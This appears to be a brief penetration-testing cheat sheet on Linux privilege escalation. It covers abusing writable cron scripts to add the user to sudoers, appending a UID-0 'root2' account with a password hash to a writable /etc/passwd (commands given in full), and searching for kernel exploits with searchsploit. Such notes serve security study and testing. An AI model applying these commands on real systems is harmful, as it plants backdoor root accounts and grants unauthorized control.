## Insecure Cronjob File Permissions

1. Enumerate cronjobs
2. Check for custom cron jobs
3. Check permissions of the script executed by cron job
4. If user has write permissions, change the script to add yourself to sudoers group.


## Insecure /etc/passwd File Permissions

If a password hash is present in the second column of
a /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available. This means that if we can write into the /etc/passwd file, we can effectively set an arbitrary password for any account.

```
// generate crypt hash for new user password
openssl passwd mypass

// add root2 user
echo "root2:Y54MpbPEHzD16:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Kernel Vulnerabilities

1. Enumerate linux kernel version (uname -r)
2. Check if exploit exists for enumerated kernel version.

```
searchsploit linux kernel ubuntu 16.04
```